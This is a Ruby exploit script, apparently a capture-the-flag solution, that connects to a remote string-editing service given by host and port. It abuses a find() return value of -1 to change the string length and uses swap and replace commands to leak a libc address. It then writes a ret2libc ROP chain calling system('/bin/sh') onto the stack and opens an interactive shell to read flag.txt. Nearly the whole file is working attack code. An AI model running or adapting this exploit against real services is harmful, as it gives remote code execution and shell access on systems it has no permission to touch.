#!/usr/bin/env ruby
# encoding: ascii-8bit

require 'expect'
require 'socket'
require 'pty'
require 'io/console'
require 'colorize'


def log data
    $stdout.puts data.inspect.black.on_white
end

def logerror e
    $stdout.puts e.inspect.black.on_red
end


module IOExtension
    def interact
        begin
            until self.closed? do
                readable, _, _, _ = IO.select([self, $stdin])
                readable.each do |source|
                    case source
                    when self
                        input = self.readchar
                        $stdout.print input.cyan
                    when $stdin
                        self.print $stdin.gets
                    else
                        raise StandardError
                    end
                end
            end
        rescue EOFError => e
            logerror e
            self.close
            return
        rescue Interrupt
            return
        end
    end
end

class IO
    prepend IOExtension
end


def replace c1, c2
    puts "replace #{c1} #{c2}"
    $s.puts "replace #{c1} #{c2}"
    if index = $from.index(c1) then $from[index] = c2 end
end

def swap i1, i2
    puts "swap #{i1} #{i2}"
    $s.puts "swap #{i1} #{i2}"
    $from[i1], $from[i2] = $from[i2], $from[i1]
end


def write_address addr
    for i in 0..7 do
        replace $from[i], addr[i]
        print $s.expect("\n> ")[0]
    end
end

def swap8_offset offset
    for i in 0..7 do
        swap i, offset+i
        print $s.expect("\n> ")[0]
    end
end

def get_stack(dump=true)
    puts "print"
    $s.puts "print"
    stack = $s.expect("\n> ")[0]

    if dump
        offset = 0
        stack.chars.each_slice(8) do |s|
            q = s.join("").unpack("Q")[0]
            if q and q != 0
                print "#{offset.to_s(16).rjust(4, ' ')}     0x#{q.to_s(16).rjust(16, '0')}     "
                p s.join('')
            end
            offset += 8
        end
        puts
    end
    return stack
end

def extract
    puts "print"
    $s.puts "print"
    stack = $s.expect("\n> ")[0]
    stack[0..7].unpack("Q")[0]
end

def get_string
    puts "print"
    $s.puts "print"
    stack = $s.expect("\n> ")[0]
    stack[0..9]
end


def giveup
    puts "quit"
    $s.puts "quit"
end

def write_address addr
    s = get_string
    for i in 0..7 do
        replace s[i], addr[i]
        print $s.expect("\n> ")[0]
    end
end


    
    
OFFSET_LIBC_SYSTEM          = 0x4f440
OFFSET_LIBC_START_MAIN_RET  = 0x21b97
OFFSET_LIBC_POP_RDI_RET     = 0x2155f
OFFSET_LIBC_BIN_SH          = 0x1b3e9a
OFFSET_LIBC_RET             = 0x8aa


host = ARGV[0]
port = ARGV[1]
$s = TCPSocket.new host, port


print challenge = $s.expect("\n> ")[0]

$from = challenge[/[a-z]{10}$/]
$from << "*" * 1000



# std::string::find() returns -1   => manipulate string length
replace 'Z', 'A' 
print $s.expect("\n> ")[0]

# dump the stack
get_stack

# Leak libc address
swap8_offset 0x88
libc_start_main_ret = extract
log("LIBC_START_MAIN_RET 0x" + libc_start_main_ret.to_s(16))

# calc libc base
libc_base = libc_start_main_ret - OFFSET_LIBC_START_MAIN_RET
log("LIBC_BASE 0x" + libc_base.to_s(16))



# write [ret] for stack alignment
libc_ret = libc_base + OFFSET_LIBC_RET
log("RET 0x" + libc_ret.to_s(16))
write_address [libc_ret].pack("Q")
swap8_offset(0x78)


# write [pop rdi; ret]
libc_pop_rdi_ret = libc_base + OFFSET_LIBC_POP_RDI_RET
log("POP_RDI_RET 0x" + libc_pop_rdi_ret.to_s(16))
write_address [libc_pop_rdi_ret].pack("Q")
swap8_offset(0x78+8)


# write [/bin/sh]
libc_bin_sh = libc_base + OFFSET_LIBC_BIN_SH
log("LIBC_BIN_SH 0x" + libc_bin_sh.to_s(16))
write_address [libc_bin_sh].pack("Q")
swap8_offset(0x78+16)


# write [system]
libc_system = libc_base + OFFSET_LIBC_SYSTEM
log("LIBC_SYSTEM 0x" + libc_system.to_s(16))
write_address [libc_system].pack("Q")
swap8_offset(0x78+24)


giveup

sleep 1
$s.puts "cat flag.txt"





$s.interact
